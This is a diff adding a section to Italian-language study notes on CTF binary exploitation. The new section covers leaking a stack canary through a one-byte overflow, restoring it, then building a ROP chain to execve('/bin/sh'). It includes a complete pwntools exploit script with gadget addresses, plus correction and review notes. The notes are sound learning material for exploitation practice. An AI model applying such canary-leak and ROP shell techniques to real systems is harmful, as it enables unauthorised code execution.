@@ -356,6 +356,62 @@ Il 33° byte (`\x01`) finisce nel byte basso di `v19`, che da `0` diventa `1` �
 > [!note] "Tutte le protezioni attive" non vuol dire sicuro
 > Canary, PIE, NX, RELRO, SHSTK/IBT difendono il **control flow** (return address, GOT, esecuzione dello stack). Qui l'attacco non tocca nessuno di quelli: cambia un **dato** (un flag di autorizzazione) con un overflow di 1 byte dentro la stessa struct/frame. Una *logic/data corruption* così passa sotto il radar di tutte le mitigazioni control-flow.
 
+### roppery · Leak del canary + ROP a `execve` su un menu a due primitive
+
+Obiettivo: shell con `execve("/bin/sh", NULL, NULL)` su un binario con **canary** attivo, **NX**, Partial RELRO, **No PIE**, SHSTK/IBT marcati. È la sintesi di tutto il resto della nota: un *leak* per battere il canary + una catena **ROP** con gadget "sporchi" + `/bin/sh` già nel binario.
+
+Il programma è un negozio di uccelli con un menu; due voci offrono due primitive diverse (si vedono in `source.c`):
+
+- **Menu 1 → `canary()`**: `read(0, buf, 41)` in `buf[40]` (overflow di **1 byte**) seguito da `printf("Ok so we got some %s ...", buf)`. È il **leak**: il 41° byte sovrascrive il byte `\x00` (LSB) del canary, così `%s` non si ferma lì e stampa i 7 byte veri del canary (vedi [[#EngineeringDegree · Leak del canary e bypass in due letture|EngineeringDegree]] per la ricostruzione `u64(b"\x00" + 7_byte)`).
+- **Menu 2 → `parrot()`**: `read(0, buf, 256)` in `buf[40]` → overflow enorme. È il **vettore ROP**.
+
+Essendo **No PIE**, indirizzi e gadget sono costanti. I gadget utili stanno nella funzione `usefull`; non c'è `system` tra gli import, quindi la strada è `execve` via **syscall** (come [[#NotSoCleanROPPlayground · Gadget "sporchi" che toccano registri extra|NotSoClean]]/[[GrandmasCake]]). `/bin/sh` è dentro il banner in `.data` — si trova con `exe.search`.
+
+Il trucco in due tempi, con un dettaglio che fa crashare se trascurato:
+
+```python
+exe = context.binary = ELF("./roppery", checksec=False)
+
+pop_rdi_r13_rcx_rax = p64(0x401241)   # pop rdi; pop r13; pop rcx; pop rax; ret
+pop_rsi_r15         = p64(0x401249)   # pop rsi; pop r15; ret
+pop_rdx             = p64(0x40123f)   # pop rdx; ret
+syscall_g           = p64(0x40124d)   # syscall
+binsh               = p64(next(exe.search(b"/bin/sh\x00")))   # 0x404106
+
+p = process("./roppery")
+
+# --- Stage 1: leak del canary (menu 1) ---
+p.recvuntil(b">"); p.send(b"1\n")
+p.recvuntil(b">")
+p.send(b"A"*41)                       # 40 + 1 byte che calpesta lo \x00 del canary
+leak = p.recvline()
+canary = u64(b"\x00" + leak[59:66])   # "Ok so we got some " (18) + 41 A = 59; poi 7 byte veri
+
+# il secondo read di canary() RICHIEDE di rimettere lo \x00, o la funzione fa
+# stack smashing al return e il processo muore prima del menu 2
+p.send(b"yes\x00" + b"A"*36 + b"\x00")   # 41 byte: byte[40] = \x00 → canary ripristinato
+p.recvuntil(b">")
+
+# --- Stage 2: ROP in parrot (menu 2) ---
+p.sendline(b"2"); p.recvuntil(b">")
+payload  = b"A"*40 + p64(canary) + b"B"*8                 # buf[40] + canary (off.40) + saved rbp
+payload += pop_rdi_r13_rcx_rax + binsh + p64(0) + p64(0) + p64(59)  # rdi=binsh, r13/rcx=junk, rax=59
+payload += pop_rsi_r15 + p64(0) + p64(0)                  # rsi=0 (argv), r15=junk
+payload += pop_rdx + p64(0)                               # rdx=0 (envp)
+payload += syscall_g                                      # execve("/bin/sh", 0, 0)
+p.send(payload)
+p.interactive()
+```
+
+> [!warning] Correzione · il leak che si auto-sabota: canary ricontrollato al `return`
+> `canary()` fa `return v2 - __readfsqword(0x28)`: **ricontrolla il canary** in uscita. La prima `read(41)` che usi per il leak ha appena corrotto il byte `\x00` del canary. Se non lo **ripristini**, la funzione chiama `__stack_chk_fail` e il processo abortisce *prima* che tu possa scegliere il menu 2. Per questo c'è una seconda `read(41)`: mandaci 41 byte col byte di indice 40 = `\x00` (il resto è indifferente, lo `strcmp("yes")` puoi ignorarlo). È il leak che "si ripulisce da solo".
+
+> [!warning] Correzione · off-by-6 su `/bin/sh`: `exe.search`, non il conteggio a mano
+> Primo tentativo: `binsh = p64(0x4040CF + 61)`. Verificato sul binario, `0x4040CF + 61 = 0x40410C` cade sui byte `h\x00…` — cioè sull'**ultima lettera** di `/bin/sh`, e `execve("h", …)` fallisce. Il `/bin/sh\0` vero sta a `0x404106` = `0x4040CF + 55` (contati 61 invece di 55). La regola, ormai ricorrente: non contare l'offset dentro la stringa a mano, usa `next(exe.search(b"/bin/sh\x00"))` che lo trova da solo.
+
+> [!note] Catena per `execve` con gadget "sporchi"
+> I gadget di `roppery` sono gli stessi "multi-pop" di NotSoClean: `pop rdi; pop r13; pop rcx; pop rax; ret` imposta `rdi` e `rax` lasciando `r13`/`rcx` da riempire con junk; `pop rsi; pop r15; ret` dà `rsi`; `pop rdx; ret` dà `rdx`. Servono tutti e 4 i registri (`rax=59`, `rdi=&/bin/sh`, `rsi=0`, `rdx=0`): dimenticare `rdx` (envp) è l'errore tipico — `execve` con `rdx` garbage fa EFAULT. `rcx` invece è inutile impostarlo: la `syscall` lo distrugge comunque (insieme a `r11`).
+
 ## Ripasso
 
 - **Il programma scrive un prompt senza andare a capo. Come lo riconosci?** Con `recvuntil`, usando i byte che segnano la fine del prompt.
@@ -368,6 +424,8 @@ Il 33° byte (`\x01`) finisce nel byte basso di `v19`, che da `0` diventa `1` �
 - **Un `strcmp` confronta il tuo input con un segreto casuale che non conosci, ma puoi overfloware dentro il buffer del segreto. Come lo batti?** Scrivi la stessa stringa null-terminata sia nel tuo buffer sia (via overflow) all'inizio del buffer del segreto: `strcmp` si ferma al primo `\0`, quindi confronta solo la parte che controlli e ignora la coda casuale. Conta la posizione del `\0`, non il contenuto.
 - **Il binario ha canary, PIE, NX e RELRO tutti attivi: è al sicuro da un overflow?** No. Quelle protezioni difendono il *control flow* (return address, GOT, stack non eseguibile). Un overflow che corrompe un **dato** adiacente — es. un flag `is_admin` subito dopo un buffer nella stessa struct — le bypassa tutte senza toccarle. Controlla sempre cosa c'è *subito dopo* il buffer che puoi sforare.
 - **Una `read(fd, buf, n)` ti lascia `buf` utilizzabile come stringa?** Non per forza: `read` copia byte grezzi e **non** aggiunge `\0`. Se il codice conta su un terminatore scritto altrove (es. solo quando l'input finisce con `\n`), mandare dati senza `\n` può saltare quella scrittura e lasciare il buffer non terminato (o conservare un byte di overflow).
+- **Leaki il canary corrompendo il suo `\x00`, ma la funzione lo ricontrolla al `return`. Come eviti il crash?** Se c'è una seconda lettura nello stesso buffer prima del `return`, usala per **rimettere `\x00`** al posto del byte di canary che avevi calpestato: il confronto torna a quadrare e la funzione esce pulita, lasciandoti proseguire.
+- **Hai trovato `/bin/sh` dentro una stringa più lunga. Come ne prendi l'indirizzo senza sbagliare l'offset?** `next(exe.search(b"/bin/sh\x00"))`: trova la sottostringa esatta da sé. Il conteggio a mano (`base + offset`) è la fonte classica di off-by-N, come puntare all'ultima lettera `h` invece che a `/`.
 
 ## Collegamenti
 
